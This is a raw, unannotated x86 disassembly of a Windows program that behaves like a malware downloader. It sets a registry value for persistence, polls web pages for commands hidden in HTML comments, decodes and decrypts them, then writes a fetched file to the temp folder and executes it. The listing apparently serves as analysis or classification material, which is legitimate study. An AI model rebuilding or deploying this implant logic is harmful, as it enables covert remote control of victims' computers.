and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x20 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp - 0x1c ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
sub edx 0x10
mov [ ebp - 0x4 ] edx
sub_404130
push ebp
mov ebp esp
mov eax 0x1900c
call sub_405000
push 0x200
push rw-data
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x200
push rw-data
push rw-data
call [ GetShortPathNameA@IAT ]
call sub_404ba3
xor eax eax
mov esp ebp
pop ebp
retn 0x10
call sub_4042dc
call sub_404a2e
push rw-data
push rw-data
call sub_4048d8
add esp 0x8
mov [ ebp - 0x19004 ] 0x0
jmp r-xdata
cmp [ ebp - 0x19004 ] 0x19000
jae r-xdata
mov ecx [ ebp - 0x19004 ]
mov [ ebp + ecx - 0x18fff ] 0x0
movsx edx [ rw-data ]
mov [ ebp - 0x1900c ] edx
mov eax [ ebp - 0x1900c ]
sub eax 0x44
mov [ ebp - 0x1900c ] eax
cmp [ ebp - 0x1900c ] 0x2f
ja r-xdata
mov edx [ ebp - 0x19004 ]
movsx eax [ edx + rw-data ]
test eax eax
je r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x1900c ]
xor ecx ecx
mov cl [ edx + lookup_table_4042ac ]
jmp [ ecx * 4 + jump_table_4042a0 ]
mov ecx [ ebp - 0x19004 ]
mov edx [ ebp - 0x19004 ]
mov al [ edx + rw-data ]
mov [ ebp + ecx - 0x19000 ] al
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
lea eax [ ebp - 0x19000 ]
push eax
call [ atoi@IAT ]
add esp 0x4
mov [ ebp - 0x19008 ] eax
mov ecx [ ebp - 0x19008 ]
imul ecx ecx 0x3c
imul ecx ecx 0x3e8
mov [ ebp - 0x19008 ] ecx
mov edx [ ebp - 0x19008 ]
push edx
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x19000 ]
push eax
call sub_404343
add esp 0x4
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x19004 ]
add ecx 0x1
mov [ ebp - 0x19004 ] ecx
jmp r-xdata
sub_4042dc
push ebp
mov ebp esp
sub esp 0x214
mov [ ebp - 0x214 ] 0x2
lea eax [ ebp - 0x210 ]
push eax
mov cx [ ebp - 0x214 ]
push ecx
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
call [ WSACleanup@IAT ]
lea eax [ ebp - 0x80 ]
push eax
push rw-data
call strcpy
add esp 0x8
push rw-data
push rw-data
call strcat
add esp 0x8
mov esp ebp
pop ebp
retn
push 0x80
lea edx [ ebp - 0x80 ]
push edx
call [ gethostname@IAT ]
sub_404343
push ebp
mov ebp esp
mov eax 0x19138
call sub_405000
push edi
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0xa8 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0xa7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x60 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x5f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0xa8 ]
push ecx
push rw-data
mov edx [ ebp + 0x8 ]
push edx
call [ sscanf@IAT ]
add esp 0x10
cmp eax 0x2
je r-xdata
mov eax 0x1
test eax eax
je r-xdata
push 0x124f80
call [ Sleep@IAT ]
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov [ ebp - 0xc4 ] eax
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
push 0x0
push __dos_header
push 0x3
push rw-data
push rw-data
push 0x0
lea ecx [ ebp - 0xa8 ]
push ecx
mov edx [ ebp - 0xc4 ]
push edx
call [ InternetConnectA@IAT ]
mov [ ebp - 0xc0 ] eax
cmp [ ebp - 0xc0 ] 0x0
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0x4000000
push rw-data
push 0x0
push rw-data
lea ecx [ ebp - 0x60 ]
push ecx
push rw-data
mov edx [ ebp - 0xc0 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0xbc ] eax
cmp [ ebp - 0xbc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc4 ]
push eax
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0xbc ]
push edx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xb8 ] eax
cmp [ ebp - 0xb8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc4 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0xc0 ]
push ecx
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x68 ] 0x20
push 0x0
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
push 0x5
mov edx [ ebp - 0xbc ]
push edx
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x64 ] eax
lea eax [ ebp - 0x20 ]
push eax
call [ atol@IAT ]
add esp 0x4
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
add ecx 0x1
push ecx
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x1912c ] eax
mov edx [ ebp - 0x1912c ]
mov [ ebp - 0xb4 ] edx
lea eax [ ebp - 0xac ]
push eax
mov ecx [ ebp - 0xb0 ]
push ecx
mov edx [ ebp - 0xb4 ]
push edx
mov eax [ ebp - 0xbc ]
push eax
call [ InternetReadFile@IAT ]
cmp [ ebp - 0xac ] 0x0
je r-xdata
mov eax [ ebp - 0xbc ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0xc0 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xc4 ]
push edx
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0xc0 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xc4 ]
push edx
call [ InternetCloseHandle@IAT ]
mov cl [ rw-data ]
mov [ ebp - 0x190c4 ] cl
mov ecx 0x63ff
xor eax eax
lea edi [ ebp - 0x190c3 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edx [ ebp - 0x190c4 ]
push edx
push 0x19000
call [ GetTempPathA@IAT ]
push 0x19000
lea eax [ ebp - 0x190c4 ]
push eax
lea ecx [ ebp - 0x190c4 ]
push ecx
call [ GetLongPathNameA@IAT ]
push rw-data
lea edx [ ebp - 0x190c4 ]
push edx
call strcat
add esp 0x8
push 0x2f
lea eax [ ebp - 0x60 ]
push eax
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x190c4 ]
push ecx
call strcat
add esp 0x8
push 0x2f
lea ecx [ ebp - 0x60 ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
add eax 0x1
push eax
lea edx [ ebp - 0x190c4 ]
push edx
call strcat
add esp 0x8
jmp r-xdata
push rw-data
lea ecx [ ebp - 0x190c4 ]
push ecx
call strcat
add esp 0x8
push rw-data
lea edx [ ebp - 0x190c4 ]
push edx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x190c8 ] eax
cmp [ ebp - 0x190c8 ] 0x0
je r-xdata
push 0x2e
lea eax [ ebp - 0x190c4 ]
push eax
call [ strrchr@IAT ]
add esp 0x8
mov [ eax ] 0x0
push 0x2e
lea edx [ ebp - 0x190c4 ]
push edx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0xac ]
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x19130 ] eax
mov edx [ ebp - 0x19130 ]
mov [ ebp - 0x190e4 ] edx
mov eax [ rw-data ]
push eax
push 0x0
mov ecx [ ebp - 0x190e4 ]
push ecx
call memset
add esp 0xc
mov edx [ ebp - 0x190e4 ]
push edx
mov eax [ ebp - 0xb4 ]
push eax
call sub_404814
add esp 0x8
mov ecx [ ebp - 0x190c8 ]
push ecx
mov edx [ rw-data ]
sub edx 0x7
push edx
push 0x1
mov eax [ ebp - 0x190e4 ]
push eax
call [ fwrite@IAT ]
add esp 0x10
mov ecx [ ebp - 0x190e4 ]
mov [ ebp - 0x19134 ] ecx
mov edx [ ebp - 0x19134 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x190c8 ]
push eax
call [ fflush@IAT ]
add esp 0x4
mov ecx [ ebp - 0x190c8 ]
push ecx
call [ fclose@IAT ]
add esp 0x4
push 0x44
push 0x0
lea edx [ ebp - 0x19128 ]
push edx
call memset
add esp 0xc
mov [ ebp - 0x19128 ] 0x44
mov [ ebp - 0x190f8 ] 0x0
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x190e0 ] eax
push rw-data
mov eax [ ebp - 0x190e0 ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x190dc ] eax
lea ecx [ ebp - 0x190d8 ]
push ecx
lea edx [ ebp - 0x19128 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x190c4 ]
push eax
call [ ebp - 0x190dc ]
mov ecx [ ebp - 0xb4 ]
mov [ ebp - 0x19138 ] ecx
mov edx [ ebp - 0x19138 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
sub_404814
push ebp
mov ebp esp
sub esp 0x224
lea ecx [ ebp - 0x224 ]
call sub_404c30
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x18 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov cl [ rw-data ]
mov [ ebp - 0xc ] cl
mov [ ebp - 0x4 ] 0x0
push 0x80
lea edx [ ebp - 0x1c ]
push edx
lea ecx [ ebp - 0x224 ]
call sub_40155b
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
mov ecx [ rw-data ]
sub ecx 0x10
cmp [ ebp - 0x8 ] ecx
jg r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ rw-data ]
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
lea ecx [ eax + edx - 0x6 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
push edx
lea ecx [ ebp - 0x224 ]
call sub_402e58
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov al [ edx ]
mov [ ecx - 0x6 ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x10
mov [ ebp - 0x8 ] eax
sub_4048d8
push ebp
mov ebp esp
mov eax 0x19014
call sub_405000
push edi
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x19000
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10 ]
movsx edx [ ecx ]
cmp edx 0x3c
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10 ]
movsx edx [ ecx ]
cmp edx 0x2d
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx ecx [ eax + 0x1 ]
cmp ecx 0x21
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ecx
mov dx [ rw-data ]
mov [ ebp - 0x19014 ] dx
mov ecx 0x63ff
xor eax eax
lea edi [ ebp - 0x19012 ]
[ edi ]
stosw [ edi ]
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x10 ]
movsx ecx [ eax + 0x1 ]
cmp ecx 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10 ]
movsx eax [ edx + 0x2 ]
cmp eax 0x2d
jne r-xdata
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x8 ] ecx
jge r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x10 ]
movsx eax [ edx + 0x2 ]
cmp eax 0x21
jne r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10 ]
movsx edx [ ecx + 0x3 ]
cmp edx 0x2d
jne r-xdata
push 0x0
lea eax [ ebp - 0x19014 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404c70
add esp 0xc
mov eax 0x1
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + edx ]
mov [ ebp + eax - 0x19014 ] dl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x10 ]
movsx edx [ ecx + 0x3 ]
cmp edx 0x3e
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_404a2e
push ebp
mov ebp esp
sub esp 0x18
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push 0x0
push __dos_header
push 0x3
push rw-data
push rw-data
push 0x0
push rw-data
mov ecx [ ebp - 0x18 ]
push ecx
call [ InternetConnectA@IAT ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0x4000000
push rw-data
push 0x0
push rw-data
push rw-data
push rw-data
mov eax [ ebp - 0x14 ]
push eax
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x18 ]
push edx
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x19000
push rw-data
mov edx [ ebp - 0x10 ]
push edx
call [ InternetReadFile@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x18 ]
push edx
call [ InternetCloseHandle@IAT ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x18 ]
push eax
call [ InternetCloseHandle@IAT ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov al [ rw-data ]
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
sub_404ba3
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] rw-data
mov [ ebp - 0x8 ] rw-data
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
push 0x80000001
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
push rw-data
call [ lstrlenA@IAT ]
push eax
push rw-data
push 0x1
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x4 ]
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
mov ecx [ ebp - 0xc ]
push ecx
call [ RegCloseKey@IAT ]
mov eax 0x1
mov eax [ ebp - 0xc ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_404c70
push ebp
mov ebp esp
sub esp 0x38
push esi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call strlen
add esp 0x4
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x4
cmp [ ebp - 0x8 ] ecx
jge r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
and ecx 0xff
push ecx
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x2
mov edx [ ebp - 0x18 ]
shr edx 0x8
and edx 0xff
push edx
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x6
or esi eax
and esi 0xff
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x18 ]
shr eax 0x8
and eax 0xff
push eax
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x4
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
and ecx 0xff
push ecx
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x4
or esi eax
and esi 0xff
mov [ ebp - 0x20 ] esi
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
push edx
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x6
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0xff
push eax
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x2
or esi eax
and esi 0xff
mov [ ebp - 0x14 ] esi
mov ecx [ ebp - 0x20 ]
shl ecx 0x8
mov edx [ ebp - 0x1c ]
or edx ecx
mov eax [ ebp - 0x14 ]
shl eax 0x10
or edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
mov edx [ ebp - 0x10 ]
add edx 0x4
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x3
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov eax [ ebp - 0xc ]
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0xff
push ecx
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x2
mov edx [ ebp - 0x2c ]
shr edx 0x8
and edx 0xff
push edx
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x6
or esi eax
and esi 0xff
mov [ ebp - 0x30 ] esi
mov eax [ ebp - 0x4 ]
mov cl [ ebp - 0x30 ]
mov [ eax ] cl
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x2c ]
shr ecx 0x8
and ecx 0xff
cmp ecx 0x3d
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x2c ] dl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x10
and eax 0xff
cmp eax 0x3d
je r-xdata
mov edx [ ebp - 0x2c ]
shr edx 0x10
and edx 0xff
cmp edx 0x3d
je r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp - 0x2c ]
shr ecx 0x18
and ecx 0xff
cmp ecx 0x3d
je r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x8
and eax 0xff
push eax
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x4
mov ecx [ ebp - 0x2c ]
shr ecx 0x10
and ecx 0xff
push ecx
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x4
or esi eax
and esi 0xff
mov [ ebp - 0x34 ] esi
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x34 ]
mov [ edx ] al
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x2c ]
shr edx 0x10
and edx 0xff
push edx
call sub_404f70
add esp 0x4
mov esi eax
shl esi 0x6
mov eax [ ebp - 0x2c ]
shr eax 0x18
and eax 0xff
push eax
call sub_404f70
add esp 0x4
shl eax 0x2
sar eax 0x2
or esi eax
and esi 0xff
mov [ ebp - 0x38 ] esi
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x38 ]
mov [ ecx ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_404f70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0xffffffff
movsx eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x5a
jg r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x30
jl r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x7a
jg r-xdata
movsx edx [ ebp + 0x8 ]
sub edx 0x41
mov [ ebp - 0x4 ] edx
jmp r-xdata
movsx eax [ ebp + 0x8 ]
cmp eax 0x2b
jne r-xdata
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x39
jg r-xdata
movsx edx [ ebp + 0x8 ]
sub edx 0x47
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
movsx ecx [ ebp + 0x8 ]
cmp ecx 0x2f
jne r-xdata
mov [ ebp - 0x4 ] 0x3e
jmp r-xdata
movsx edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x3f
sub_405000
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4051d9
cmp [ rw-data ] ebx
jne r-xdata
call sub_4051c4
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4051d6
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_404130
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40154b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax rw-data
mov esp ebp
pop ebp
retn
sub_404c30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_404c50
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_404c50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
memset
jmp [ memset@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_purecall
jmp [ _purecall@IAT ]
strlen
jmp [ strlen@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4051c4
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4051d6
xor eax eax
retn
sub_4051d9
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
